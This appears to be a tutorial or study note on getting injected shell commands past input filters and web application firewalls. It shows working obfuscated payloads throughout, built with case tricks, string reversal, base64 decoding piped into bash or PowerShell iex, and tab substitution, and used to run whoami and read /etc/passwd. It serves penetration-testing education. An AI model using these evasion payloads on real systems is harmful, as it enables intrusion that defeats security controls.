## Overview

When basic filter bypass techniques fail, we may be dealing with:

- strong input validation
- keyword detection engines
- Web Application Firewalls (WAFs)
- pattern-based blocking
- behaviour-based filtering

Advanced obfuscation techniques allow us to execute commands without including obvious malicious strings.

Goal:

make payload **functionally identical** while **syntactically different**.

We exploit differences between:

- how filters detect commands
- how shells interpret commands

---

# 1. Case Manipulation

Filters often check exact strings.

Example blacklist entry:

```
whoami
```

Filter may fail to detect variations:

```
WHOAMI
WhOaMi
wHoAmI
```

---

## Windows Behaviour

Windows command interpreters are case-insensitive.

Example:

```powershell
WhOaMi
```

Executes successfully.

---

## Linux Behaviour

Linux commands are case-sensitive.

We must convert mixed-case strings back to lowercase during execution.

Example using tr:

```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

Result:

```
whoami
```

Command executes successfully.

---

## Space Filter Consideration

Previous command includes spaces:

```
tr "[A-Z]" "[a-z]"
```

If spaces are filtered, replace with tab:

```
%09
```

Example:

```
$(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")
```

---

## Alternative lowercase conversion

```bash
$(a="WhOaMi";printf %s "${a,,}")
```

Bash converts string to lowercase.

Produces:

```
whoami
```

---

# 2. Reversed Commands

Commands can be reversed and reconstructed at runtime.

Original command:

```
whoami
```

Reversed:

```
imaohw
```

---

## Linux reversal technique

Generate reversed string:

```bash
echo 'whoami' | rev
```

Execute reversed string:

```bash
$(rev<<<'imaohw')
```

Shell reverses string before execution.

Filter does not detect original command.

---

## Windows reversal technique

Reverse string:

```powershell
"whoami"[-1..-20] -join ''
```

Execute reversed command:

```powershell
iex "$('imaohw'[-1..-20] -join '')"
```

---

# 3. Base64 Encoded Commands

Encoding hides filtered characters.

Example command:

```bash
cat /etc/passwd | grep 33
```

Encode command:

```bash
echo -n 'cat /etc/passwd | grep 33' | base64
```

Encoded result:

```
Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
```

---

## Linux execution using decoding

```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

Command decoded and executed.

Avoids direct use of:

```
cat
|
/
```

---

## Avoiding filtered pipe character

Instead of:

```
|
```

use:

```
<<<
```

Input redirection avoids pipe usage.

---

# 4. Encoding for Windows PowerShell

Convert command to base64:

```powershell
[Convert]::ToBase64String(
[System.Text.Encoding]::Unicode.GetBytes('whoami'))
```

Encoded string:

```
dwBoAG8AYQBtAGkA
```

Execute decoded command:

```powershell
iex "$(
[System.Text.Encoding]::Unicode.GetString(
[System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')
))"
```

Command executes successfully.

---

# 5. Linux UTF Conversion for Windows Compatibility

Convert encoding before base64:

```bash
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
```

Produces compatible encoded command.

Useful when targeting Windows systems from Linux environment.


Combining methods increases bypass reliability.
